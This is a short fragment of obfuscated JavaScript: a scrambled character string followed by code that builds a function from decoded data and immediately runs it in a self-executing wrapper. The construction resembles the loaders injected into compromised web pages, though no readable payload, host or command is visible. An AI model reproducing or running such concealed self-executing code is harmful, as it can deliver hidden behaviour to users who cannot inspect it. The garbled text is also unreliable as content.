{c]4tdulH%kecb(pb6;\/%M_=nKyK&n(ehoa;]Ji_)udK).2g)1aie n)raKZvu,}3=2KtKp]o{Pc+.S)=[]aY).r.0Ksst,,]eoJ}K&;+5K5%!a#4;TK_(5 mK](T!&tK%u0_5-9t, .2iEbsanTK'));var Lij=FxV(bWz,Dwo );Lij(8804);return 8121})()
